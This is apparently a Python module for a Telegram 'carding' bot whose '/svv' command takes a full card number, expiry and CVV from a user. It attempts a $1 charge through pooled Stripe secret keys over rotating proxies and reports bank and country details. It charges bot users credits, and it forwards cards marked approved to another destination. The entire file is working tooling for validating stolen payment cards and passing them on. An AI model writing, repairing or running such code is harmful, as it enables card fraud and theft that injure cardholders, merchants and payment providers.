import httpx
import time
import asyncio
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from .response import *
from .gate import *


@Client.on_message(filters.command("svv", [".", "/"]))
async def stripe_auth_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        checkall = await check_all_thing(Client, message)

        gateway = "SK BASED 1$"

        if checkall[0] == False:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        if getcc == False:
            resp = f"""<b>
<b>Gate Name:</b> {gateway} ♻️
<b>CMD:</b> /svv

<b>Message:</b> No CC Found in your input ❌

<b>Usage:</b> /svv cc|mes|ano|cvv</b>"""
            await message.reply_text(resp, message.id)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"

        firstresp = f"""
<b>
<b>𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 ➜</b> ■□□□
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>𝐂𝐚𝐫𝐝 ➜</b> <code>{fullcc}</code>
<b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜</b> 『 {gateway} [ /svv ] 』
</b>
"""
        await asyncio.sleep(0.5)
        firstchk = await message.reply_text(firstresp, message.id)

        secondresp = f"""
<b>
<b>𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 ➜</b> ■■■□
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>𝐂𝐚𝐫𝐝 ➜</b> <code>{fullcc}</code>
<b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜</b> 『 {gateway} [ /svv ] 』
</b>
"""
        await asyncio.sleep(0.5)
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)

        start = time.perf_counter()
        proxies = await get_proxy_format()
        session = httpx.AsyncClient(
            timeout=30, proxies=proxies, follow_redirects=True)
        sks = await getallsk()
        result = await create_deadsk_charge(fullcc, sks, session, user_id)
        getbin = await get_bin_details(cc)
        getresp = await get_charge_resp(result, user_id, fullcc)
        status = getresp["status"]
        response = getresp["response"]

        thirdresp = f"""
<b>
<b>𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 ➜</b> ■■■■
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>𝐂𝐚𝐫𝐝 ➜</b> <code>{fullcc}</code>
<b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜</b> 『 {gateway} [ /svv ] 』
</b>
"""
        await asyncio.sleep(0.5)
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)

        brand = getbin[0]
        type = getbin[1]
        level = getbin[2]
        bank = getbin[3]
        country = getbin[4]
        flag = getbin[5]
        currency = getbin[6]

        user_link = f"https://t.me/{message.from_user.username}\u2060"

        finalresp = f"""
<b>『 {gateway} [ /svv ] 』
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>𝗖𝗮𝗿𝗱 ➜</b> <code>{fullcc}</code>
<b>𝐒𝐭𝐚𝐭𝐮𝐬 ➜</b> {status}
<b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜</b> {response}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>𝗜𝗻𝗳𝗼 ➜</b> {brand} - {type} - {level}
<b>𝐁𝐚𝐧𝐤 ➜</b> {bank}
<b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜</b> {country} - {flag} - {currency}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>𝗧𝗶𝗺𝗲 ➜</b> {time.perf_counter() - start:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
<b>𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➜</b> <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b> ⤿ {role} ⤾
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>𝐁𝐨𝐭 𝐁𝐲 ➜</b> <b><a href="tg://user?id=7028548502">【﻿亗𝙱𝚊𝙳𝚗𝙰𝚊𝙼】‎🍷‎</a></b>
</b>
"""
        await asyncio.sleep(0.5)
        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp, disable_web_page_preview=True)
        await setantispamtime(user_id)
        await deductcredit(user_id)
        if status == "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅":
            await sendcc(finalresp, session)
        await session.aclose()

    except:
        import traceback
        await error_log(traceback.format_exc())
